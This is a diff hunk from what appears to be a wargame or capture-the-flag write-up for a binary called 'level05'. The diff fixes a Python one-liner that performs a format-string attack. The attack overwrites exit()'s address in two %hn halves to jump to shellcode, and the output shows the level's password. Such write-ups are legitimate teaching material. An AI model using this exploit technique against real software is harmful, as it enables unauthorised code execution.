@@ -35,7 +35,7 @@ Last step would be to get the actual address of that shellcode in our environmen
 Finally piece everything together... To make our life easier, we'll split our attack in two part so that overriding the whole address of `exit()` will be faster. We'll override high order bytes first at `exit()` address and low order bytes at `exit()` address + **2**.
 
 ```shell
-  $> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%<LOWER_BYTES_OFFSET>c%10$hn" + "%<HIGHER_BYTES_OFFSET>%11$hn"' | ./level05
+  $> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%<LOWER_BYTES_OFFSET>c%10$hn" + "%<HIGHER_BYTES_OFFSET>c%11$hn"' | ./level05
   ...
   h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
